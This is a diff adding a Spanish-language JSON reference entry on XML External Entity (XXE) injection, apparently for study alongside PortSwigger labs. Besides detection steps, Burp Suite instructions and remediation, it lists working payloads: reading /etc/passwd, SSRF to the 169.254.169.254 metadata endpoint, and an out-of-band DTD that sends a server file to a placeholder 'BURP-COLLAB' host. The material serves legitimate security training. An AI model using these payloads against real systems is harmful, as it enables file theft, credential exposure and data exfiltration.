@@ -1,0 +1,54 @@
+{
+  "id": "xxe",
+  "name": "XML External Entity (XXE)",
+  "category": "Injection",
+  "severity": "High",
+  "aka": ["XXE"],
+  "summary": "Un parser XML mal configurado procesa entidades externas definidas por el atacante, permitiendo leer archivos del servidor, SSRF o exfiltración out-of-band.",
+  "where_to_look": [
+    "Endpoints que aceptan XML: SOAP, sitemaps, importadores, APIs que aceptan Content-Type application/xml.",
+    "Formatos basados en XML: SVG, DOCX/XLSX, RSS, SAML.",
+    "Peticiones que parecen JSON pero también aceptan XML si cambias el Content-Type."
+  ],
+  "detection": [
+    "Inyecta una entidad externa apuntando a un archivo local y observa si su contenido se refleja.",
+    "Si no hay reflejo (ciega), usa entidades de parámetro hacia Burp Collaborator.",
+    "Prueba a cambiar el Content-Type de JSON a XML en endpoints que no esperaban XML."
+  ],
+  "burp_steps": [
+    "Captura una petición que envíe XML y mándala al Repeater.",
+    "Define un DOCTYPE con una entidad externa SYSTEM y refléjala en un campo que se devuelva.",
+    "Para leer archivos: &xxe; en un campo cuyo valor aparezca en la respuesta.",
+    "Para SSRF: apunta la entidad a una URL interna o a 169.254.169.254.",
+    "Ciega/OOB: usa una entidad de parámetro externa que cargue un DTD malicioso desde Collaborator."
+  ],
+  "payloads": {
+    "Lectura de archivos": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><stockCheck><productId>&xxe;</productId></stockCheck>"
+    ],
+    "SSRF vía XXE": [
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>"
+    ],
+    "OOB (ciega) — DTD externo": [
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://BURP-COLLAB/x.dtd\"> %xxe;]>"
+    ],
+    "DTD malicioso (alojado en el exploit server)": [
+      "<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLAB/?x=%file;'>\">%eval;%exfil;"
+    ]
+  },
+  "commands": [],
+  "remediation": [
+    "Deshabilita el procesamiento de DTD y entidades externas en el parser XML.",
+    "Usa formatos menos peligrosos (JSON) cuando sea posible.",
+    "Mantén las librerías de parseo actualizadas con configuración segura por defecto."
+  ],
+  "portswigger_labs": [
+    {"title": "XXE para leer archivos", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files"},
+    {"title": "XXE para realizar SSRF", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf-attacks"},
+    {"title": "XXE ciega out-of-band", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction"}
+  ],
+  "references": [
+    {"title": "PortSwigger — XXE injection", "url": "https://portswigger.net/web-security/xxe"},
+    {"title": "OWASP — XXE", "url": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"}
+  ]
+}
